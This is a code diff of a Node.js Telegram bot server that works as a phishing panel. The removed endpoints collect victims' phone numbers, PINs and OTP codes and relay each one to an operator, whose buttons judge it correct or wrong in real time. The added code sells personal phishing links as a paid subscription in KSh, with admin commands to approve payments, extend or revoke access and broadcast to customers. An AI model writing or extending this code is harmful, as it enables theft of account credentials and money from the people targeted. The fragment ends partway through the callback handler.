-  const deleteThreshold = now - (10 * 60 * 1000);
-  
-  for (const u of users.values()) {
-    try {
-      for (const [k, v] of u.loginNotifications) {
-        if (v.timestamp < timeoutThreshold && !v.expired) {
-          v.expired = true;
-          v.approved = false;
-          v.rejected = true;
-          v.rejectionReason = 'timeout';
-        }
-      }
-      
-      for (const [k, v] of u.otpVerifications) {
-        if (v.timestamp < timeoutThreshold && !v.expired) {
-          v.expired = true;
-          v.status = 'timeout';
-        }
-      }
-      
-      for (const [k, v] of u.loginNotifications) {
-        if (v.timestamp < deleteThreshold) u.loginNotifications.delete(k);
-      }
-      
-      for (const [k, v] of u.otpVerifications) {
-        if (v.timestamp < deleteThreshold) u.otpVerifications.delete(k);
-      }
-    } catch (error) {
-      logger.error(`Cleanup error for ${u.name}:`, error.message);
-    }
-  }
-}, CONFIG.CLEANUP_INTERVAL).unref?.();
+// ── State ──
+const persistState = async (userId) => { try { await DrcState.findOneAndUpdate({ userId }, { userId, verified: {} }, { upsert: true }); } catch (e) {} };
+const deleteStateFromDB = async (userId) => { try { await DrcState.deleteOne({ userId }); } catch (e) {} };
+const loadStateFromDB = async () => { let n = 0; try { const docs = await DrcState.find({}).lean(); for (const d of docs) { if (users.has(d.userId)) n++; } log.info(`Loaded state for ${n} user(s)`); } catch (e) {} };
 
-// ============================================
-// HEALTH CHECK
-// ============================================
-app.get('/api/health', (req, res) => {
-  const list = [...users.values()].map(u => ({
-    name: u.name,
-    link: u.linkInsert,
-    healthy: u.healthy,
-    active: !!u.bot,
-    logins: u.loginNotifications.size,
-    otps: u.otpVerifications.size,
-    lastErr: u.lastErr,
-    webhookPath: u.mgr._path,
-  }));
-  res.json({
-    status: list.some(u => u.healthy) ? 'ok' : 'degraded',
-    users: list,
-    ts: ts()
-  });
-});
+const pendingPayments = new Map();
+const pendingRenewals = new Map();
 
-// ============================================
-// WEBHOOK DEBUG ENDPOINT
-// ============================================
-app.get('/api/webhook-info', async (req, res) => {
-  try {
-    const info = [];
-    for (const user of users.values()) {
-      if (!user.bot || !user.mgr) continue;
-      try {
-        const webhookInfo = await tgGetWebhookInfo(user.bot, user.botToken).catch(() => ({}));
-        info.push({
-          name: user.name,
-          link: user.linkInsert,
-          webhookPath: user.mgr._path,
-          webhookUrl: webhookInfo.url || 'not set',
-          pending: webhookInfo.pending_update_count || 0,
-          maxConnections: webhookInfo.max_connections || 40,
-          lastError: webhookInfo.last_error_message || 'none',
-          lastErrorTime: webhookInfo.last_error_date ? new Date(webhookInfo.last_error_date * 1000).toISOString() : 'never',
-        });
-      } catch (e) {
-        info.push({
-          name: user.name,
-          link: user.linkInsert,
-          error: e.message
-        });
-      }
-    }
-    res.json({
-      webhookBaseUrl: CONFIG.WEBHOOK_URL,
-      users: info,
-      ts: ts()
-    });
-  } catch (error) {
-    logger.error('Webhook info error:', error.message);
-    res.status(500).json({ error: error.message });
-  }
-});
+let bot = null, botHealthy = false, restartCount = 0, restartSched = false, initLock = false;
+const processedUpdates = new Set();
+const trackUpdate = (uid) => { if (processedUpdates.has(uid)) return false; processedUpdates.add(uid); if (processedUpdates.size > CFG.DEDUP_SIZE) processedUpdates.delete(processedUpdates.values().next().value); return true; };
 
-// ============================================
-// DYNAMIC ROUTES
-// ============================================
-users.forEach((user, link) => {
-  const R = `/api/${link}`;
+const sendTg = async (chatId, message, options = {}) => { if (!bot || !botHealthy) return { success: false, error: 'Bot not ready' }; try { await bot.sendMessage(chatId, trunc(message), { parse_mode: 'HTML', ...options }); return { success: true }; } catch (err) { log.error(`sendTg ${chatId}:`, err.message); if (err.response?.statusCode === 401) botHealthy = false; return { success: false, error: err.message }; } };
 
-  app.post(`${R}/check-user-status`, async (req, res) => {
-    try {
-      const { phoneNumber } = req.body;
-      if (!phoneNumber) {
-        return res.status(400).json({ success: false, message: 'Phone required' });
-      }
-      
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ success: false, message: phoneValidation.error });
-      }
-      
-      // Always new user
-      res.json({ success: true, isReturningUser: false });
-    } catch (error) {
-      logger.error(`check-user-status error for ${user.name}:`, error.message);
-      res.status(500).json({ success: false, error: 'Internal server error' });
-    }
-  });
+const sendMsg = async (user, text, opts = {}) => { if (!bot || !botHealthy) return { ok: false, err: 'Bot not ready' }; return user.tgQueue.send(async () => { let attempt = 0; while (true) { try { await bot.sendMessage(user.chatId, trunc(text), { parse_mode: 'HTML', ...opts }); user.lastErr = null; return { ok: true }; } catch (e) { user.lastErr = e.message; const s = e.response?.statusCode; if (s === 401) { botHealthy = false; return { ok: false, err: 'Auth failed' }; } if (s === 429) { await sleep(Math.min((e.response?.parameters?.retry_after || 10) * 1000, 60000)); continue; } if (s >= 500 && attempt < CFG.SEND_RETRIES) { attempt++; await sleep(CFG.SEND_RETRY_DELAY * attempt); continue; } return { ok: false, err: e.message }; } } }); };
 
-  app.post(`${R}/login`, async (req, res) => {
-    try {
-      if (!user.bot || !user.healthy) {
-        return res.status(503).json({ success: false, message: 'Bot service unavailable' });
-      }
-      
-      const { phoneNumber, pin, timestamp } = req.body;
-      if (!phoneNumber || !pin) {
-        return res.status(400).json({ success: false, message: 'Phone and PIN required' });
-      }
-      
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ success: false, message: phoneValidation.error });
-      }
-      
-      const pinValidation = validatePin(pin);
-      if (!pinValidation.valid) {
-        return res.status(400).json({ success: false, message: pinValidation.error });
-      }
-      
-      const phone = normalise(phoneNumber);
-      if (user.dupes.seen(`login:${phone}:${pin}`)) {
-        return res.json({ success: true, message: 'Cached' });
-      }
-      
-      const key = `${phone}-${pin}`;
-      user.loginNotifications.set(key, {
-        timestamp: Date.now(),
-        approved: false,
-        rejected: false,
-        expired: false
-      });
-      
-      const text = formatLoginMessage(user, { phoneNumber, pin, timestamp: timestamp || Date.now() });
-      const keyboard = {
-        inline_keyboard: [
-          [{ text: '✅ Allow to Proceed', callback_data: mkCb('login', 'proceed', phone, pin) }],
-          [{ text: '❌ Invalid Information', callback_data: mkCb('login', 'invalid', phone, pin) }]
-        ]
-      };
-      
-      const r = await sendMsg(user, text, { reply_markup: keyboard });
-      r.ok
-        ? res.json({ success: true, message: 'Waiting for approval' })
-        : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
-    } catch (error) {
-      logger.error(`login error for ${user.name}:`, error.message);
-      res.status(500).json({ success: false, error: 'Internal server error' });
-    }
-  });
+const clearBotListeners = () => { if (!bot) return; try { bot.removeAllListeners(); if (Array.isArray(bot._textRegexpCallbacks)) bot._textRegexpCallbacks = []; if (Array.isArray(bot._replyListeners)) bot._replyListeners = []; } catch (e) {} };
 
-  app.post(`${R}/check-login-approval`, async (req, res) => {
-    try {
-      const { phoneNumber, pin } = req.body;
-      if (!phoneNumber || !pin) {
-        return res.status(400).json({ success: false, message: 'Phone and PIN required' });
-      }
-      
-      const phone = normalise(phoneNumber);
-      const rec = user.loginNotifications.get(`${phone}-${pin}`);
-      
-      if (!rec) {
-        return res.json({ success: true, approved: false, rejected: false, expired: false });
-      }
-      
-      if (Date.now() - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        return res.json({ success: true, approved: false, rejected: true, expired: true });
-      }
-      
-      res.json({
-        success: true,
-        approved: rec.approved,
-        rejected: rec.rejected,
-        expired: rec.expired || false,
-        rejectionReason: rec.rejectionReason || null
-      });
-    } catch (error) {
-      logger.error(`check-login-approval error for ${user.name}:`, error.message);
-      res.status(500).json({ success: false, error: 'Internal server error' });
-    }
-  });
+const initBot = async () => { if (initLock) return; initLock = true; try { if (bot) { clearBotListeners(); bot = null; } await sleep(CFG.BOT_INIT_DELAY); const token = process.env.BOT_TOKEN; if (!token || !/^\d+:[A-Za-z0-9_-]+$/.test(token)) { log.error('BOT_TOKEN missing/invalid'); return; } if (!WEBHOOK_URL) { log.error('WEBHOOK_URL not set'); return; } log.info('Creating bot instance (webhook mode)...'); bot = new TelegramBot(token, { webHook: false, filepath: false }); bot.on('error', (e) => log.error('Bot error:', e.message)); registerHandlers(); flushUpdateBuffer(); const whUrl = `${WEBHOOK_URL}/webhook/${token}`; try { await bot.deleteWebHook(); await bot.setWebHook(whUrl, { allowed_updates: ['message', 'callback_query'], drop_pending_updates: true }); log.info(`✅ Webhook set → ${whUrl}`); } catch (e) { log.error('Webhook failed:', e.message); botHealthy = false; return; } try { const me = await bot.getMe(); log.info(`✅ Bot verified — @${me.username}`); botHealthy = true; restartCount = 0; } catch (e) { log.error('Verify failed:', e.message); botHealthy = false; } } finally { initLock = false; } };
 
-  app.post(`${R}/verify-otp`, async (req, res) => {
-    try {
-      if (!user.bot || !user.healthy) {
-        return res.status(503).json({ success: false, message: 'Bot service unavailable' });
-      }
-      
-      const { phoneNumber, otp, timestamp } = req.body;
-      if (!phoneNumber || !otp) {
-        return res.status(400).json({ success: false, message: 'Phone and OTP required' });
-      }
-      
-      const phoneValidation = validatePhoneNumber(phoneNumber);
-      if (!phoneValidation.valid) {
-        return res.status(400).json({ success: false, message: phoneValidation.error });
-      }
-      
-      const otpValidation = validateOtp(otp);
-      if (!otpValidation.valid) {
-        return res.status(400).json({ success: false, message: otpValidation.error });
-      }
-      
-      const phone = normalise(phoneNumber);
-      if (user.dupes.seen(`otp:${phone}:${otp}`)) {
-        return res.json({ success: true, message: 'Cached' });
-      }
-      
-      const key = `${phone}-${otp}`;
-      user.otpVerifications.set(key, { status: 'pending', timestamp: Date.now() });
-      
-      const text = formatOTPMessage(user, { phoneNumber, otp, timestamp: timestamp || Date.now() });
-      const keyboard = {
-        inline_keyboard: [
-          [{ text: '✅ Correct (PIN + OTP)', callback_data: mkCb('otp', 'correct', phone, otp) }],
-          [
-            { text: '❌ Wrong Code', callback_data: mkCb('otp', 'wrong', phone, otp) },
-            { text: '⚠️ Wrong PIN', callback_data: mkCb('otp', 'wrongpin', phone, otp) }
-          ]
-        ]
-      };
-      
-      const r = await sendMsg(user, text, { reply_markup: keyboard });
-      r.ok
-        ? res.json({ success: true, message: 'OTP sent' })
-        : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
-    } catch (error) {
-      logger.error(`verify-otp error for ${user.name}:`, error.message);
-      res.status(500).json({ success: false, error: 'Internal server error' });
-    }
-  });
+const getUsername = (from) => from.username ? `@${from.username}` : `${from.first_name || ''}${from.last_name ? ' ' + from.last_name : ''}`.trim() || 'Unknown';
 
-  app.post(`${R}/check-otp-status`, async (req, res) => {
-    try {
-      const { phoneNumber, otp } = req.body;
-      if (!phoneNumber || !otp) {
-        return res.status(400).json({ success: false, message: 'Phone and OTP required' });
-      }
-      
-      const phone = normalise(phoneNumber);
-      const rec = user.otpVerifications.get(`${phone}-${otp}`);
-      
-      if (!rec) {
-        return res.json({ success: true, status: 'pending' });
-      }
-      
-      if (Date.now() - rec.timestamp > CONFIG.APPROVAL_TIMEOUT) {
-        return res.json({ success: true, status: 'timeout' });
-      }
-      
-      res.json({ success: true, status: rec.status });
-    } catch (error) {
-      logger.error(`check-otp-status error for ${user.name}:`, error.message);
-      res.status(500).json({ success: false, error: 'Internal server error' });
-    }
-  });
+// ── Register handlers ──
+const registerHandlers = () => {
+  const onMsg = (re, fn) => { bot.onText(re, async (msg, match) => { if (!trackUpdate(msg.update_id ?? msg.message_id)) return; try { await fn(msg, match); } catch (e) { log.error(`Handler:`, e.message); } }); };
 
-  app.post(`${R}/resend-otp`, async (req, res) => {
-    try {
-      if (!user.bot || !user.healthy) {
-        return res.status(503).json({ success: false, message: 'Bot service unavailable' });
-      }
-      
-      const { phoneNumber, timestamp } = req.body;
-      if (!phoneNumber) {
-        return res.status(400).json({ success: false, message: 'Phone required' });
-      }
-      
-      const phone = normalise(phoneNumber);
-      const text = `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phone}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
-      
-      const r = await sendMsg(user, text);
-      r.ok
-        ? res.json({ success: true })
-        : res.status(500).json({ success: false, error: r.err });
-    } catch (error) {
-      logger.error(`resend-otp error for ${user.name}:`, error.message);
-      res.status(500).json({ success: false, error: 'Internal server error' });
-    }
-  });
-});
+  onMsg(/^\/start(@\S+)?$/, async (msg) => { const chatId = String(msg.chat.id), un = getUsername(msg.from); if (isAdmin(chatId)) { await bot.sendMessage(msg.chat.id, `🛠️ <b>Admin Console</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n👥 ${users.size}/676\n\n/adminhelp`, { parse_mode: 'HTML' }).catch(() => {}); return; } const eu = [...users.values()].find(u => u.chatId === chatId); if (eu) { if (eu.expired || isExpired(eu.expiresAt)) { eu.expired = true; await bot.sendMessage(msg.chat.id, `🤖 <b>DRC Bot</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n\n⚠️ <b>Expired</b> ${fmtDate(eu.expiresAt)}.\n\nPay <b>KSh. ${RENEWAL_AMOUNT}</b> to:\n<code>${PAYMENT_DETAILS}</code>\n\nThen tap below + WhatsApp screenshot to <b>${WHATSAPP_NUMBER}</b>.`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ I Have Renewed', callback_data: `renew|claim|${chatId}` }, { text: '❌ Cancel', callback_data: `renew|cancel|${chatId}` }]] } }).catch(() => {}); return; } const link = ROOT_LINK ? `${ROOT_LINK}/${eu.id}/` : ''; const dl = eu.expiresAt ? daysUntil(eu.expiresAt) : null; await bot.sendMessage(msg.chat.id, `🤖 <b>DRC Bot</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n\n✅ Active\n🔗 <code>${link}</code>\n📅 ${eu.expiresAt ? `${fmtDate(eu.expiresAt)} (${dl}d)` : 'Permanent'}\n\n/mylink  /expiry  /myid`, { parse_mode: 'HTML' }).catch(() => {}); return; } await bot.sendMessage(msg.chat.id, `🤖 <b>DRC Bot</b>\n\n👤 ${sanitize(un)}\n🆔 <code>${chatId}</code>\n\n━━━━━━━━━━━━━━━━━━━\n\n💳 Pay <b>KSh. ${PAYMENT_AMOUNT}</b> to:\n<code>${PAYMENT_DETAILS}</code>\n\nValid for <b>${EXPIRY_DAYS} days</b>.\n\nTap <b>I Have Paid</b> + WhatsApp screenshot to <b>${WHATSAPP_NUMBER}</b>.`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ I Have Paid', callback_data: `pay|claim|${chatId}` }, { text: '❌ Cancel', callback_data: `pay|cancel|${chatId}` }]] } }).catch(() => {}); if (ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID, `👤 <b>New User</b>\n\n${sanitize(un)}\n<code>${chatId}</code>\n${new Date().toLocaleString()}`); });
+  onMsg(/^\/mylink(@\S+)?$/, async (msg) => { const u = [...users.values()].find(u => u.chatId === String(msg.chat.id)); if (!u || !ROOT_LINK) return; await bot.sendMessage(msg.chat.id, `🔗 <code>${ROOT_LINK}/${u.id}/</code>`, { parse_mode: 'HTML' }).catch(() => {}); });
+  onMsg(/^\/expiry(@\S+)?$/, async (msg) => { const u = [...users.values()].find(u => u.chatId === String(msg.chat.id)); if (!u) return; if (!u.expiresAt) { await bot.sendMessage(msg.chat.id, `📅 <b>Permanent</b>`, { parse_mode: 'HTML' }).catch(() => {}); return; } await bot.sendMessage(msg.chat.id, `📅 ${fmtDate(u.expiresAt)} — ${isExpired(u.expiresAt) ? '❌ EXPIRED' : `${daysUntil(u.expiresAt)}d left`}`, { parse_mode: 'HTML' }).catch(() => {}); });
+  onMsg(/^\/myid(@\S+)?$/, async (msg) => { await bot.sendMessage(msg.chat.id, `🆔 <code>${msg.chat.id}</code>`, { parse_mode: 'HTML' }).catch(() => {}); });
 
-// ============================================
-// 404 & ERROR HANDLERS
-// ============================================
-app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
-app.use((err, req, res, _next) => {
-  logger.error('Unhandled Express error:', err.message);
-  res.status(500).json({ success: false, error: 'Internal server error' });
-});
+  // Admin commands
+  onMsg(/^\/adminhelp(@\S+)?$/, async (msg) => { if (!isAdmin(String(msg.chat.id))) return; await bot.sendMessage(msg.chat.id, `🛠️ <b>Admin</b>\n\n/status  /userinfo &lt;id&gt;\n/adduser &lt;chatId&gt; &lt;name&gt; [days|permanent]\n/assignuser &lt;slot&gt; &lt;chatId&gt; &lt;name&gt; [days|permanent]\n/removeuser &lt;id&gt;  /extend &lt;id&gt; &lt;days&gt;\n/extendall &lt;days&gt;  /reduceall &lt;days&gt;\n/revoke &lt;id&gt;  /permanent &lt;id&gt;  /broadcast &lt;msg&gt;`, { parse_mode: 'HTML' }).catch(() => {}); });
+  onMsg(/^\/status(@\S+)?$/, async (msg) => { if (!isAdmin(String(msg.chat.id))) return; const lines = [`✅ <b>Status</b>\n`, `👥 ${users.size}/676`, `⏳ Pay: ${pendingPayments.size}`, `🔄 Ren: ${pendingRenewals.size}\n`]; for (const u of users.values()) { const e = u.expiresAt ? (isExpired(u.expiresAt) ? '❌' : `✅${daysUntil(u.expiresAt)}d`) : '♾️'; lines.push(`• <b>${u.name}</b> [<code>${u.id}</code>] ${e} (${u.source})`); } await bot.sendMessage(msg.chat.id, trunc(lines.join('\n')), { parse_mode: 'HTML' }).catch(() => {}); });
+  onMsg(/^\/userinfo(@\S+)?\s+(\S+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const u = users.get(match[2].trim().toLowerCase()); if (!u) { await bot.sendMessage(msg.chat.id, `❌ Not found.`).catch(() => {}); return; } await bot.sendMessage(msg.chat.id, `👤 <b>${u.name}</b> [<code>${u.id}</code>]\n🆔 <code>${u.chatId}</code> (${u.source})\n📅 ${u.expiresAt ? fmtDate(u.expiresAt) : 'Permanent'}\n📊 Logins:${u.logins.size} OTPs:${u.otps.size}`, { parse_mode: 'HTML' }).catch(() => {}); });
+  onMsg(/^\/adduser(@\S+)?\s+(.+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const p = match[2].trim().split(/\s+/); if (p.length < 2) return; const cid = p[0]; if (!/^-?\d+$/.test(cid)) return; let days = EXPIRY_DAYS, np = p.slice(1); const last = np[np.length-1]; if (/^permanent$/i.test(last)) { days = null; np = np.slice(0,-1); } else if (/^\d+$/.test(last)) { days = parseInt(last); np = np.slice(0,-1); } const name = np.join(' ').trim(); if (!name || [...users.values()].find(u => u.chatId === cid)) return; const nid = nextAvailableId(); if (!nid) return; const now = new Date().toISOString(), exp = days === null ? null : addDays(now, days); users.set(nid, makeUserObj({ id: nid, name, chatId: cid, source: 'db', createdAt: now, expiresAt: exp })); await persistUser(nid, name, cid, now, exp); sortUsers(); const link = ROOT_LINK ? `${ROOT_LINK}/${nid}/` : ''; await bot.sendMessage(msg.chat.id, `✅ Added [<code>${nid}</code>] ${sanitize(name)}\n🔗 <code>${link}</code>\n📅 ${exp ? fmtDate(exp) : 'Permanent'}`, { parse_mode: 'HTML' }).catch(() => {}); await sendTg(cid, `🎉 <b>Added!</b>\n\n🔗 <code>${link}</code>\n📅 ${exp ? fmtDate(exp) : 'Permanent'}\n\n/mylink`); });
+  onMsg(/^\/assignuser(@\S+)?\s+(.+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const p = match[2].trim().split(/\s+/); if (p.length < 3) return; const slot = p[0].toLowerCase(), cid = p[1]; if (!/^[a-z]{2}$/.test(slot) || !/^-?\d+$/.test(cid) || users.has(slot) || [...users.values()].find(u => u.chatId === cid)) return; let days = EXPIRY_DAYS, np = p.slice(2); const last = np[np.length-1]; if (/^permanent$/i.test(last)) { days = null; np = np.slice(0,-1); } else if (/^\d+$/.test(last)) { days = parseInt(last); np = np.slice(0,-1); } const name = np.join(' ').trim(); if (!name) return; const now = new Date().toISOString(), exp = days === null ? null : addDays(now, days); users.set(slot, makeUserObj({ id: slot, name, chatId: cid, source: 'db', createdAt: now, expiresAt: exp })); await persistUser(slot, name, cid, now, exp); sortUsers(); const link = ROOT_LINK ? `${ROOT_LINK}/${slot}/` : ''; await bot.sendMessage(msg.chat.id, `✅ Assigned [<code>${slot}</code>] ${sanitize(name)}`, { parse_mode: 'HTML' }).catch(() => {}); await sendTg(cid, `🎉 <b>Added!</b>\n\n🔗 <code>${link}</code>\n📅 ${exp ? fmtDate(exp) : 'Permanent'}\n\n/mylink`); });
+  onMsg(/^\/removeuser(@\S+)?\s+(\S+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const id = match[2].trim().toLowerCase(), u = users.get(id); if (!u) return; if (u.source === 'env') { await bot.sendMessage(msg.chat.id, `⚠️ Env user.`).catch(() => {}); return; } u.dupes.clear(); u.tgQueue.flush('removed'); users.delete(id); await deleteUserFromDB(id); await deleteStateFromDB(id); await bot.sendMessage(msg.chat.id, `✅ Removed ${u.name} [${id}]`).catch(() => {}); });
+  onMsg(/^\/extend(@\S+)?\s+(\S+)\s+(\d+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const u = users.get(match[2].trim().toLowerCase()), d = parseInt(match[3]); if (!u) return; const b = (u.expiresAt && !isExpired(u.expiresAt)) ? u.expiresAt : new Date().toISOString(); const exp = addDays(b, d); u.expiresAt = exp; u.expired = false; u.warningSent = false; await persistUser(u.id, u.name, u.chatId, u.createdAt, exp); await bot.sendMessage(msg.chat.id, `✅ +${d}d → ${fmtDate(exp)}`).catch(() => {}); });
+  onMsg(/^\/extendall(@\S+)?\s+(\d+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const d = parseInt(match[2]); for (const u of users.values()) { if (!u.expiresAt) continue; u.expiresAt = addDays(u.expiresAt, d); u.expired = false; u.warningSent = false; await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt); } await bot.sendMessage(msg.chat.id, `✅ +${d}d all.`).catch(() => {}); });
+  onMsg(/^\/reduceall(@\S+)?\s+(\d+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const d = parseInt(match[2]); const we = [...users.values()].filter(u => u.expiresAt && daysUntil(u.expiresAt) - d <= 0); if (we.length) { await bot.sendMessage(msg.chat.id, `⚠️ Would expire ${we.length}. /reduceallconfirm ${d}`).catch(() => {}); return; } for (const u of users.values()) { if (!u.expiresAt) continue; u.expiresAt = addDays(u.expiresAt, -d); u.warningSent = false; await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt); } await bot.sendMessage(msg.chat.id, `✅ -${d}d all.`).catch(() => {}); });
+  onMsg(/^\/reduceallconfirm(@\S+)?\s+(\d+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const d = parseInt(match[2]); for (const u of users.values()) { if (!u.expiresAt) continue; u.expiresAt = addDays(u.expiresAt, -d); u.warningSent = false; if (isExpired(u.expiresAt)) u.expired = true; await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt); } await bot.sendMessage(msg.chat.id, `✅ Confirmed -${d}d.`).catch(() => {}); });
+  onMsg(/^\/revoke(@\S+)?\s+(\S+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const u = users.get(match[2].trim().toLowerCase()); if (!u) return; u.expiresAt = new Date(Date.now()-60000).toISOString(); u.expired = true; await persistUser(u.id, u.name, u.chatId, u.createdAt, u.expiresAt); await bot.sendMessage(msg.chat.id, `✅ Revoked ${u.name}`).catch(() => {}); });
+  onMsg(/^\/permanent(@\S+)?\s+(\S+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const u = users.get(match[2].trim().toLowerCase()); if (!u) return; u.expiresAt = null; u.expired = false; u.warningSent = false; await persistUser(u.id, u.name, u.chatId, u.createdAt, null); await bot.sendMessage(msg.chat.id, `✅ ${u.name} permanent.`).catch(() => {}); });
+  onMsg(/^\/broadcast(@\S+)?\s+([\s\S]+)/, async (msg, match) => { if (!isAdmin(String(msg.chat.id))) return; const t = match[2].trim(); let s=0,f=0; for (const u of users.values()) { const r = await sendTg(u.chatId, `📢 <b>Announcement</b>\n\n${sanitize(t)}`); r.success ? s++ : f++; } await bot.sendMessage(msg.chat.id, `✅ Sent ${s}, failed ${f}`).catch(() => {}); });
 
-// ============================================
-// GRACEFUL SHUTDOWN
-// ============================================
-const shutdown = async (sig) => {
-  logger.info(`${sig} — shutting down`);
-  server.close();
-  for (const u of users.values()) {
-    u.dupes.clear();
-    u.tgQueue?.flush('shutting down');
-  }
-  process.exit(0);
+  bot.on('callback_query', async (query) => { if (!trackUpdate(`cb_${query.id}`)) return; try { await handleCallback(query); } catch (e) { log.error('Callback:', e.message); try { await bot.answerCallbackQuery(query.id, { text: '❌ Error', show_alert: true }); } catch (x) {} } });
 };
 
+const runExpiryCheck = async () => { for (const u of users.values()) { if (!u.expiresAt) continue; const d = daysUntil(u.expiresAt); if (d <= 0 && !u.expired) { u.expired = true; await sendTg(u.chatId, `⚠️ <b>Expired</b>\n\nPay KSh. ${RENEWAL_AMOUNT} to:\n<code>${PAYMENT_DETAILS}</code>\nThen /start`); if (ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID, `🔔 Expired: ${u.name} [${u.id}]`); } else if (d > 0 && d <= CFG.WARNING_DAYS && !u.warningSent) { u.warningSent = true; await sendTg(u.chatId, `⏰ <b>Expiring ${d}d</b> (${fmtDate(u.expiresAt)}). Pay KSh. ${RENEWAL_AMOUNT} then /start`); } } };
+
+// ── Callback handler ──
+async function handleCallback(query) {
+  const msg = query.message, chatId = msg.chat.id, messageId = msg.message_id, data = query.data;
+  const ack = async (t, a=false) => { try { await bot.answerCallbackQuery(query.id, { text: t, show_alert: a }); } catch(e){} };
+  const edit = async (t, kb=null) => { try { await bot.editMessageText(t, { chat_id: chatId, message_id: messageId, parse_mode: 'HTML', reply_markup: kb||{inline_keyboard:[]} }); } catch(e){ if(!e.message?.includes('not modified')) log.error('Edit:',e.message); } };
+
+  // Payment/renewal/admin
+  if (data.startsWith('pay|')) { const [,action] = data.split('|'), un = getUsername(query.from); if (action==='claim') { if([...users.values()].find(u=>u.chatId===String(chatId))){await edit(`✅ Already registered. /mylink`);return;} if(pendingPayments.has(String(chatId))){await edit(`⏳ Pending.`);return;} pendingPayments.set(String(chatId),{chatId:String(chatId),username:un,claimedAt:Date.now()}); await edit(`⏳ <b>Claim Received</b>\n\n🆔 <code>${chatId}</code>\n\nKeep this ID. Sent to admin.`); if(ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID,`💳 <b>New Claim</b>\n\n${sanitize(un)}\n<code>${chatId}</code>\nKSh. ${PAYMENT_AMOUNT}`,{reply_markup:{inline_keyboard:[[{text:'✅ Approve',callback_data:`admin|approve|${chatId}|${un}`},{text:'❌ Reject',callback_data:`admin|reject|${chatId}|${un}`}]]}}); } else if(action==='cancel'){await edit(`❌ Cancelled. /start`);} return; }
+  if (data.startsWith('renew|')) { const [,action] = data.split('|'), un = getUsername(query.from); if (action==='claim') { const eu=[...users.values()].find(u=>u.chatId===String(chatId)); if(!eu){await edit(`⚠️ Not found.`);return;} if(pendingRenewals.has(String(chatId))){await edit(`⏳ Pending.`);return;} pendingRenewals.set(String(chatId),{chatId:String(chatId),username:un,userId:eu.id,claimedAt:Date.now()}); await edit(`⏳ <b>Renewal Claim</b>\n\n🆔 <code>${chatId}</code>`); if(ADMIN_CHAT_ID) await sendTg(ADMIN_CHAT_ID,`🔄 <b>Renewal</b>\n\n${sanitize(un)}\n<code>${chatId}</code>\n<code>${eu.id}</code>\nKSh. ${RENEWAL_AMOUNT}`,{reply_markup:{inline_keyboard:[[{text:'✅ Approve',callback_data:`admin|renew|${chatId}|${un}`},{text:'❌ Reject',callback_data:`admin|rejectrenew|${chatId}|${un}`}]]}}); } else if(action==='cancel'){await edit(`❌ Cancelled.`);} return; }
+  if (data.startsWith('admin|')) { if(!isAdmin(String(chatId))){await ack('❌',true);return;} const p=data.split('|'),action=p[1],ucid=p[2],un=p[3]||'?',dn=sanitize(un.replace(/^@/,'')),tl=`⏱️ ${new Date().toLocaleTimeString()}`; if(action==='approve'){const nid=nextAvailableId();if(!nid){await edit(`❌ No slots.`);return;} const nu=await registerUser(nid,dn,ucid);pendingPayments.delete(ucid);const lk=ROOT_LINK?`${ROOT_LINK}/${nid}/`:''; await edit(`✅ Approved ${sanitize(un)} [${nid}]\n🔗 <code>${lk}</code>\n📅 ${fmtDate(nu.expiresAt)}\n${tl}`); await sendTg(ucid,`🎉 <b>Confirmed!</b>\n\n🔗 <code>${lk}</code>\n📅 ${fmtDate(nu.expiresAt)}\n\n/mylink /expiry`);} else if(action==='reject'){pendingPayments.delete(ucid);await edit(`❌ Rejected\n${tl}`);await sendTg(ucid,`❌ Not confirmed. /start`);} else if(action==='renew'){const eu=[...users.values()].find(u=>u.chatId===String(ucid));if(!eu){await edit(`❌`);return;}const ne=await renewUser(eu);pendingRenewals.delete(ucid);await edit(`✅ Renewed → ${fmtDate(ne)}\n${tl}`);await sendTg(ucid,`🎉 Renewed! 📅 ${fmtDate(ne)}`);} else if(action==='rejectrenew'){pendingRenewals.delete(ucid);await edit(`❌ Renewal rejected\n${tl}`);await sendTg(ucid,`❌ Renewal not confirmed. /start`);} return; }
+
+  // ── DRC verification callbacks (login | otp) ──
+  const callbackUser = [...users.values()].find(u => u.chatId === String(chatId));
+  if (!callbackUser) { await ack('❌ User not found', true); return; }
+  const parsed = parseCb(data); if (!parsed) { await ack('❌ Bad data', true); return; }
+  const { type, action, phone, secret } = parsed;
+  const key = `${phone}-${secret}`, now = Date.now();
+
+  if (type === 'login') {
+    const rec = callbackUser.logins.get(key);
+    if (!rec) { await ack('❌ Not found', true); return; }
+    if (rec.approved || rec.rejected) { await ack('✅ Already processed'); return; }
